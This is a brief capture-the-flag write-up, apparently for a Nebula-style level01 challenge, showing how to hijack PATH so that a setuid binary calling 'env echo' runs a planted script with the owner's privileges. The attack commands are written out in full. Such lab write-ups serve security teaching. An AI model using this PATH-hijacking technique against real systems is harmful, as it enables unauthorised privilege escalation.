### Level 01

```system("/usr/bin/env echo and now what?");```  
The line above executes ```/usr/bin/env echo and now what?``` in the host environment and returns.  

Looking at the permissions of ```/home/flag01/flag01``` you can notice that the file has the ```setuid``` bit set.  
This means that after we (user ```level00```) run this executable, it is going to run with the file system permissions of the owner
(user ```flag00``` ).

We can "switch" then the ```echo``` with our own version of ```echo``` which is going to execute ```getflag```(with the permissions of ```flag01```):

```
mkdir /home/level01/bin  

echo '#!/bin/bash  
getflag' > /home/level01/bin/echo

chmod +x /home/level01/bin/echo
```
We add our newly created directory to PATH ```PATH=/home/level01/bin:$PATH```    
  
We execute ```/home/flag01/flag01``` and we're done.